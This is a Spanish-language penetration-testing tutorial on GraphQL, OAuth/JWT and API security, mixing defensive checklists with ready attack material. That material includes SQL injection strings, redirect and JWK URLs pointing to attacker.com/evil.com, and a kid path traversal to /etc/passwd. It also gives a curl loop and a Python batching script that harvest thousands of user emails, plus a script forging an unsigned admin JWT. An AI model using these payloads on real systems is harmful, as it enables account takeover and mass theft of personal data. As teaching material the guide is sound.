# GraphQL Security

## ¿Qué es GraphQL?

```
Query language para APIs desarrollado por Facebook

VENTAJAS:
• Single endpoint (/graphql)
• Cliente pide exactamente lo que necesita
• Fuertemente tipado
• Introspección (self-documenting)

ESTRUCTURA:
• Queries (leer datos)
• Mutations (modificar datos)
• Subscriptions (tiempo real)

EJEMPLO QUERY:
query {
  user(id: 123) {
    name
    email
    posts {
      title
    }
  }
}
```

---

## GraphQL Reconnaissance

### **Introspection Query:**

```graphql
# Descubrir TODO el schema
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

# Si introspection está habilitado → mapa completo
```

---

### **GraphQL Voyager:**

```bash
# Visualizar schema gráficamente
# https://graphql-kit.com/graphql-voyager/

# O instalar localmente
npm install -g graphql-voyager
graphql-voyager

# Pegar introspection query result
# Muestra todas las relaciones
```

---

## GraphQL Vulnerabilities

### **1. Information Disclosure:**

```graphql
# Query recursivo profundo
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            # ... hasta agotar recursos
          }
        }
      }
    }
  }
}

# Sin depth limiting → DoS o leak masivo
```

---

### **2. IDOR en GraphQL:**

```graphql
# Query normal
{
  user(id: 123) {
    name
    email
  }
}

# Ataque: cambiar ID
{
  user(id: 456) {
    name
    email
    sensitiveData
  }
}

# Batch queries (bypass rate limit)
{
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
  # ... hasta 1000+
}
```

---

### **3. Batching Attack:**

```graphql
# Enumerar usuarios (bypass rate limiting)
[
  { "query": "{ user(id: 1) { email } }" },
  { "query": "{ user(id: 2) { email } }" },
  { "query": "{ user(id: 3) { email } }" },
  # ... array de 10,000 queries
]

# Single HTTP request
# Extrae miles de emails
```

---

### **4. Field Suggestions:**

```graphql
# Query inválido
{
  user(id: 123) {
    naem  # typo intencional
  }
}

# Response puede revelar campos reales
{
  "errors": [{
    "message": "Cannot query field 'naem'. Did you mean 'name', 'email', 'password_hash', 'ssn'?"
  }]
}

# Fuzzing para descubrir campos ocultos
```

---

### **5. SQL Injection en GraphQL:**

```graphql
# Si backend vulnerable
{
  user(id: "1' OR '1'='1") {
    name
  }
}

# O
mutation {
  login(username: "admin' --", password: "x") {
    token
  }
}
```

---

## GraphQL Tools

### **GraphQLmap:**

```bash
# Instalar
git clone https://github.com/swisskyrepo/GraphQLmap
cd GraphQLmap
pip3 install -r requirements.txt

# Ejecutar
python3 graphqlmap.py -u https://example.com/graphql

# Comandos:
graphqlmap> dump_new   # Schema dump
graphqlmap> dump_old   # Legacy dump
graphqlmap> nosqli     # NoSQL injection
graphqlmap> sqli       # SQL injection
```

---

### **InQL (Burp Extension):**

```
Burp > Extender > BApp Store > InQL Scanner

FEATURES:
• Introspección automática
• Generate queries
• Scanner de vulnerabilidades
• GraphQL aware
```

---

### **BatchQL:**

```bash
# Batching attack tool
git clone https://github.com/assetnote/batchql
cd batchql

# Extraer emails masivamente
python3 batchql.py -u https://example.com/graphql -q user_emails.txt
```

---

# OAuth y JWT

## OAuth 2.0

### **Flujo OAuth:**

```
1. Usuario → App
2. App → Redirect a Authorization Server
3. Usuario autoriza
4. Authorization Server → Redirect con code
5. App → Intercambia code por token
6. App usa token para acceder a recursos
```

---

### **OAuth Vulnerabilities:**

```
1. REDIRECT_URI MANIPULATION
   • Cambiar redirect_uri a servidor malicioso
   • https://evil.com?code=ABC123

2. CSRF en OAuth
   • Sin state parameter
   • Vincular cuenta de atacante a víctima

3. CLIENT_SECRET EXPOSURE
   • Secret hardcodeado en mobile app
   • JavaScript source code

4. SCOPE ESCALATION
   • Pedir más scopes de los autorizados
   • scope=read → scope=read,write,admin
```

---

### **Testing OAuth:**

```bash
# 1. Interceptar flujo
# Burp > HTTP History > Buscar oauth/authorize

# 2. Manipular redirect_uri
https://auth.example.com/oauth/authorize?
  client_id=123&
  redirect_uri=https://attacker.com&
  scope=read

# 3. Verificar state parameter
# Ausencia → CSRF vulnerable

# 4. Replay de tokens
# Usar token expirado/revocado
```

---

## JWT Deep Dive

### **JWT Structure:**

```
HEADER:
{
  "alg": "HS256",
  "typ": "JWT"
}

PAYLOAD:
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "exp": 1516242622,
  "role": "user"
}

SIGNATURE:
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```

---

### **JWT Attack Checklist:**

```bash
# 1. Algorithm confusion
# RS256 (asymmetric) → HS256 (symmetric)
# Usar public key como HMAC secret

# 2. None algorithm
# alg: "none"
# Eliminar signature

# 3. Weak secret bruteforce
jwt-tool [token] -C -d /usr/share/wordlists/rockyou.txt

# 4. Kid (Key ID) manipulation
# "kid": "/etc/passwd"
# "kid": "../../public.key"
# Path traversal

# 5. JKU (JSON Web Key URL)
# "jku": "https://attacker.com/jwks.json"
# Host malicious public key

# 6. JWT Injection
# "email": "admin@example.com\u0000@evil.com"
```

---

### **jwt_tool:**

```bash
# Instalar
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 jwt_tool.py -h

# Scan de vulnerabilidades
python3 jwt_tool.py [token] -M at

# Tamper payload
python3 jwt_tool.py [token] -T

# Bruteforce secret
python3 jwt_tool.py [token] -C -d wordlist.txt

# None algorithm
python3 jwt_tool.py [token] -X a

# RS256 → HS256
python3 jwt_tool.py [token] -X k -pk public.pem
```

---

# API Security Testing

## Herramientas Profesionales

### **Postman:**

```
FEATURES:
• Collections (organizar requests)
• Environments (dev, staging, prod)
• Tests (JavaScript)
• Automation (Newman CLI)

TESTING:
pm.test("Status is 200", function() {
  pm.response.to.have.status(200);
});

pm.test("Response has user", function() {
  var jsonData = pm.response.json();
  pm.expect(jsonData.user).to.exist;
});

# Exportar collection
# Correr con Newman
newman run collection.json -e environment.json
```

---

### **Insomnia:**

```
Similar a Postman
• Interface más limpia
• GraphQL support nativo
• Environment variables
• Code generation

IDEAL PARA:
• GraphQL testing
• REST APIs
• Quick prototyping
```

---

### **Burp Suite - API Testing:**

```
EXTENSIONS:
• Autorize (authorization testing)
• InQL (GraphQL)
• JWT Editor
• OpenAPI Parser
• Param Miner

WORKFLOW:
1. Proxy traffic (mobile app o Postman)
2. Identificar endpoints en sitemap
3. Autorize → automatic authorization testing
4. Intruder → parameter fuzzing
5. Repeater → manual testing
```

---

### **OWASP ZAP - API Scan:**

```bash
# API scan with OpenAPI spec
zap-cli --api-key [key] quick-scan \
  --self-contained \
  --start-options "-config api.addrs.addr.name=.* -config api.addrs.addr.regex=true" \
  https://api.example.com

# Import OpenAPI/Swagger
ZAP > Import > Import an OpenAPI definition
```

---

## Automated API Security Testing

### **REST API Fuzzer:**

```bash
# RESTler (Microsoft)
git clone https://github.com/microsoft/restler-fuzzer
cd restler-fuzzer

# Compile swagger
python3 Restler.py compile --api_spec swagger.json

# Test
python3 Restler.py test --grammar_file compiled/grammar.py

# Fuzz
python3 Restler.py fuzz --grammar_file compiled/grammar.py
```

---

### **API Security Checklist:**

```
AUTHENTICATION:
□ JWT signature verification
□ Token expiration enforced
□ Refresh token rotation
□ Rate limiting on auth endpoints
□ MFA support
□ Password complexity enforced

AUTHORIZATION:
□ BOLA/IDOR testing
□ Vertical privilege escalation
□ Horizontal privilege escalation
□ Function level authorization

INPUT VALIDATION:
□ SQL injection
□ NoSQL injection
□ XXE (XML APIs)
□ XSS in API responses
□ Command injection
□ SSRF

CONFIGURATION:
□ CORS properly configured
□ Security headers (X-Frame-Options, CSP)
□ HTTPS enforced
□ TLS 1.2+ only
□ Certificate pinning (mobile)

RATE LIMITING:
□ All endpoints limited
□ X-Forwarded-For bypass tested
□ GraphQL batching limited

DATA EXPOSURE:
□ Sensitive data not in URLs
□ Verbose errors disabled
□ Stack traces hidden
□ Debug endpoints removed

API KEYS:
□ Keys rotated regularly
□ Keys not in client-side code
□ Keys scoped properly
□ Revocation mechanism exists
```

---

## Real-World API Hacking Scenarios

### **Scenario 1: BOLA en E-commerce:**

```bash
# 1. Crear cuenta, comprar producto
POST /api/orders
{"product_id": 123, "quantity": 1}

Response:
{"order_id": 5001}

# 2. Ver orden
GET /api/orders/5001
Response: Order details

# 3. IDOR attack
for i in {1..10000}; do
  curl https://api.example.com/api/orders/$i \
    -H "Authorization: Bearer [token]" \
    | grep -i "customer_email"
done

# Extrae emails de 10,000 órdenes
# GDPR violation + data breach
```

---

### **Scenario 2: GraphQL Batching:**

```python
# Script para extraer todos los usuarios
import requests

url = "https://api.example.com/graphql"
headers = {"Content-Type": "application/json"}

# Crear batch query
queries = []
for user_id in range(1, 10001):
    queries.append({
        "query": f"{{ user{user_id}: user(id: {user_id}) {{ email }} }}"
    })

# Single request, 10k users
response = requests.post(url, json=queries, headers=headers)
print(response.json())

# Extrae 10,000 emails en 1 segundo
```

---

### **Scenario 3: JWT None Algorithm:**

```python
import base64
import json

# Original JWT
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.signature"

# Decodear header y payload
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "john", "role": "admin"}  # Cambiar role

# Encodear
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")

# New token (sin signature)
new_token = f"{header_b64}.{payload_b64}."

print(new_token)
# Usar en Authorization header
# Si servidor no valida alg → admin access
```